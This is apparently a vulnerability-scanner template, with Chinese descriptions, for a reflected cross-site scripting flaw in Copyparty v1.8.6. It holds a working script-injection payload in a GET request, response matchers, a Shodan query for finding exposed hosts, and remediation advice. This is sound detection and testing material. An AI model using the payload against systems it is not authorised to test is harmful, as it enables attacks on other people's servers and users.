id: copyparty-xss

info:
  name: Copyparty v1.8.6 - 跨站脚本漏洞
  author: theamanrawat
  severity: medium
  description: Copyparty v1.8.6 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：Upgrade to the latest version to mitigate this vulnerability。
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://github.com/9001/copyparty/security/advisories/GHSA-cw7j-v52w-fp5r
  classification:
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"copyparty"
  tags: copyparty,xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/?hc=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<a href="/"><script>alert(document.domain)</script>'
          - 'choose your OS'
        condition: and

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
